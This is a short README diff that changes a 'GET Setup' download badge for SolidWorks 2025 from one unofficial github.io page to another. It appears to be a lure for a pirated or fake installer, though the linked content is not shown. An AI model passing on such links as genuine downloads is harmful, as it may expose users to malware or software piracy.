@@ -4,7 +4,7 @@
   <img src="https://1000logos.net/wp-content/uploads/2020/08/SolidWorks-Logo.png" alt="SolidWorks Logo"/>
 </p>
 
-[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://apostolucy326834.github.io/.github/SolidWorks-2025)
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://solidworks-setup.github.io/.github/)
 
 ---
 
